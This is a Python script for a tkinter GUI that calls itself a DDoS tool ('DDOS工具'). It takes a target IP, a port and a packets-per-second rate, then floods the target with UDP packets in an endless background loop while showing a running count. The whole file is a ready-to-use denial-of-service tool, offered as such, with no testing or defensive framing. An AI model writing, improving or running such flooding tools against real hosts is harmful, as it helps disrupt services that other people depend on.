import socket
import time
import tkinter as tk
from tkinter import ttk
import threading

def send_udp_requests(ip, port, speed):
    # 创建 UDP 套接字
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    packet_count = 0
    try:
        while True:
            # 构造一个简单的测试数据包，这里可以根据实际需求修改数据包内容
            data = b"Test UDP Packet"
            start_time = time.time()
            sock.sendto(data, (ip, port))
            end_time = time.time()
            elapsed_time = end_time - start_time

            packet_count += 1
            status_label.config(text=f"已发送第 {packet_count} 个数据包到 {ip}:{port}，耗时：{elapsed_time:.6f} 秒")

            time.sleep(1 / speed)
    except Exception as e:
        print(f"发生错误: {e}")
    finally:
        sock.close()


def start_requests():
    ip = ip_entry.get()
    port = int(port_entry.get())
    speed = int(speed_entry.get())
    t = threading.Thread(target=send_udp_requests, args=(ip, port, speed))
    t.start()


def adjust_opacity(value):
    root.attributes('-alpha', float(value))


root = tk.Tk()
root.title("DDOS工具")

label = tk.Label(root, text="<DigitalTrailBlazer>")
label.pack(pady=20)

ip_label = tk.Label(root, text="请输入 IP 地址:")
ip_label.pack()
ip_entry = tk.Entry(root)
ip_entry.pack()

port_label = tk.Label(root, text="请输入端口号:")
port_label.pack()
port_entry = tk.Entry(root)
port_entry.pack()

speed_label = tk.Label(root, text="请输入请求速度（每秒请求次数）:")
speed_label.pack()
speed_entry = tk.Entry(root)
speed_entry.pack()

start_button = tk.Button(root, text="开始请求", command=start_requests)
start_button.pack()

status_label = tk.Label(root, text="")
status_label.pack()

opacity_scale = ttk.Scale(root, from_=0.1, to=1.0, orient="horizontal", command=adjust_opacity)
opacity_scale.set(1.0)
opacity_scale.pack()

root.mainloop()